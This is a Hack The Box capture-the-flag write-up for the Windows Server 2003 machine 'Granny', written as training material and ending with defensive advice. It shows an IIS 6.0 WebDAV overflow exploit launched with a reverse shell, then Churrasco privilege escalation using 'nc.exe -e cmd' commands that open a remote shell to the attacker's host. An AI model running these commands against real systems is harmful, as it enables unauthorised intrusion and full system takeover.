@@ -1,0 +1,248 @@
+---
+title: "HTB - Granny"
+author: "M0k4"
+date: "2026-05-26"
+tags: ["htb", "writeup", "windows", "easy", "iis6,", "webdav,", "bufferoverflow,", "seimpersonateprivilege,", "churrasco,", "windows-exploitation"]
+---
+# HTB - Granny
+
+**IP Address:** `10.10.10.15`  
+**OS:** Windows Server 2003  
+**Difficulty:** Easy  
+**Tags:** #IIS6, #WebDAV, #BufferOverflow, #SeImpersonatePrivilege, #Churrasco, #Windows-Exploitation
+
+---
+## Synopsis
+
+Granny is an easy Windows machine vulnerable to a classic **IIS 6.0 WebDAV buffer overflow (CVE-2017-7269)**.  
+Exploitation leads to an initial shell as a low-privileged user. Privilege escalation is achieved by abusing the **SeImpersonatePrivilege** via **Churrasco.exe** on Windows Server 2003 to obtain `NT AUTHORITY\SYSTEM`.
+
+---
+## Skills Required
+
+- Basic Windows service enumeration  
+- Knowledge of IIS and WebDAV vulnerabilities  
+- Understanding of Windows privilege escalation techniques  
+
+## Skills Learned
+
+- Exploiting **IIS 6.0 PROPFIND buffer overflow**  
+- Abusing **SeImpersonatePrivilege** on legacy Windows systems  
+- Using **Churrasco.exe** for SYSTEM escalation  
+
+---
+## 1. Initial Enumeration
+
+### 1.1 Connectivity Test
+
+Check if the host is alive using ICMP:
+
+
+We begin by checking if the target is alive with ICMP:
+
+```bash
+ping -c 1 10.10.10.15
+```
+
+![ping](cases/HackTheBox/Machines/EASY/Granny/screenshots/ping.png)
+
+The machine responds, confirming it is alive.
+
+---
+### 1.2 Port Scanning
+
+Scan all TCP ports to identify open services:
+
+
+We scan all 65,535 TCP ports to identify open services:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.15 -oG allPorts
+```
+
+![allports](cases/HackTheBox/Machines/EASY/Granny/screenshots/allports.png)
+
+Extract the open ports:
+
+```bash
+extractPorts allPorts
+```
+
+![extractports](cases/HackTheBox/Machines/EASY/Granny/screenshots/extractports.png)
+
+Only port **80/tcp** is open.
+
+---
+### 1.3 Targeted Scan
+
+Run a deeper scan on the identified ports with version detection and default scripts:
+
+
+We run a deeper scan with version detection and default NSE scripts:
+
+```bash
+nmap -p80 -sC -sV 10.10.10.15 -oN targeted
+```
+
+![targeted](cases/HackTheBox/Machines/EASY/Granny/screenshots/targeted.png)
+
+**Findings:**
+
+| Port | Service | Version/Description |
+|------|---------|---------------------|
+| 80   | HTTP    | Microsoft IIS 6.0 with WebDAV enabled |
+
+The service runs **IIS 6.0 WebDAV**, an outdated version known to be vulnerable.
+
+---
+## 2. Service Enumeration
+
+### 2.1 IIS HTTP surface
+
+Confirm the web server responds on port 80:
+
+```bash
+curl -i http://10.10.10.15/
+```
+
+---
+## 3. Foothold
+
+### 3.1 IIS 6.0 WebDAV buffer overflow (CVE-2017-7269)
+
+During the targeted scan we identify **WebDAV**, a set of HTTP extensions that allows collaborative editing and file management. IIS 6.0 is known to be vulnerable to **CVE-2017-7269**.
+
+Exploit reference: [IIS6 Exploit (CVE-2017-7269)](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)
+
+We clone the exploit:
+
+```bash
+git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
+```
+
+![exploit](cases/HackTheBox/Machines/EASY/Granny/screenshots/exploit.png)
+
+This is a classic **buffer overflow** triggered via the **PROPFIND** WebDAV request:
+
+![exploit_propfind](cases/HackTheBox/Machines/EASY/Granny/screenshots/exploit_propfind.png)
+
+The exploit script requires:
+
+- `targetip`  
+- `targetport`  
+- `reverseip`  
+- `reverseport`
+
+We run the exploit and set up a listener with `nc`:
+
+```bash
+python2 iis6\ reverse\ shell 10.10.10.15 80 10.10.14.2 443
+```
+
+![exploit_run](cases/HackTheBox/Machines/EASY/Granny/screenshots/exploit_run.png)
+
+âœ… Reverse shell obtained.
+
+---
+### 3.2 Post-exploitation enumeration
+
+We check our privileges and system structure:
+
+```powershell
+whoami
+```
+
+![whoami](cases/HackTheBox/Machines/EASY/Grandpa/screenshots/whoami.png)
+
+On Windows Server 2003, user profiles are located in **`Documents and Settings`** instead of `Users`:
+
+![users](cases/HackTheBox/Machines/EASY/Granny/screenshots/users.png)
+
+Checking privileges:
+
+![priv](cases/HackTheBox/Machines/EASY/Granny/screenshots/priv.png)
+
+We have **SeImpersonatePrivilege** enabled, which can be exploited for privilege escalation.
+
+---
+## 4. Privilege Escalation
+
+### 4.1 Churrasco.exe (`SeImpersonatePrivilege`)
+
+Normally, **JuicyPotato** would be used, but it does not support Windows Server 2003 due to missing CLSIDs. 
+
+![JP_clsid](cases/HackTheBox/Machines/EASY/Granny/screenshots/JP_clsid.png)
+
+Instead, we use **Churrasco.exe**, a community version adapted for Windows Server 2003.
+
+Exploit reference: [Privilege Escalation â€“ Churrasco.exe](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)
+
+We upload `churrasco.exe` via an SMB share:
+
+```bash
+impacket-smbserver smbFolder $(pwd)
+```
+
+On the victim:
+
+```powershell
+dir \\10.10.14.2\smbFolder\
+copy \\10.10.14.2\smbFolder\churrasco.exe churrasco.exe
+```
+
+![upload_churrasco](cases/HackTheBox/Machines/EASY/Granny/screenshots/upload_churrasco.png)
+
+Move to `Temp` directory if copying fails.  
+
+Running without arguments fails, so we must specify a command:
+
+![execute_churrasco](screenshots/execute_churrasco.png)
+
+To get a more stable shell, we upload `nc.exe` via SMB and then execute it with Churrasco:
+
+```bash
+.\churrasco.exe "\\10.10.14.2\smbFolder\nc.exe -e cmd 10.10.14.2 4444"
+```
+
+If it fails, try renaming the share or copying locally:
+
+```bash
+.\churrasco.exe "nc.exe -e cmd 10.10.14.2 4444"
+copy "\\10.10.14.2\smb\nc.exe" nc.exe
+```
+
+![whoami_churrasco](cases/HackTheBox/Machines/EASY/Grandpa/screenshots/whoami_churrasco.png)
+
+âœ… Privilege escalation successful â€“ we are `NT AUTHORITY\SYSTEM`.
+
+### 4.2 Flags
+
+With SYSTEM access, we can retrieve both flags:
+
+```powershell
+dir C:\Documents and Settings\Administrator\Desktop
+```
+
+![root_user_flag](cases/HackTheBox/Machines/EASY/Granny/screenshots/root_user_flag.png)
+
+âœ… **User flag obtained**  
+âœ… **Root flag obtained**
+
+---
+# âœ… MACHINE COMPLETE
+
+---
+## Summary of Exploitation Path
+
+1. **Port Scanning** â†’ Detected IIS 6.0 on port 80.  
+2. **WebDAV Buffer Overflow (CVE-2017-7269)** â†’ Remote code execution with reverse shell.  
+3. **Privilege Escalation** â†’ Abused `SeImpersonatePrivilege` using **Churrasco.exe**.  
+4. **Post-Exploitation** â†’ Retrieved user and root flags as SYSTEM.
+
+---
+## Defensive Recommendations
+
+- **Upgrade IIS 6.0**: It is end-of-life and should be replaced with a supported version.  
+- **Disable WebDAV** if not required.  
+- **Restrict Privileges**: Remove `SeImpersonatePrivilege` from unnecessary accounts.  
+- **Monitor for Exploits**: Log and alert on abnormal WebDAV requests such as `PROPFIND`.  
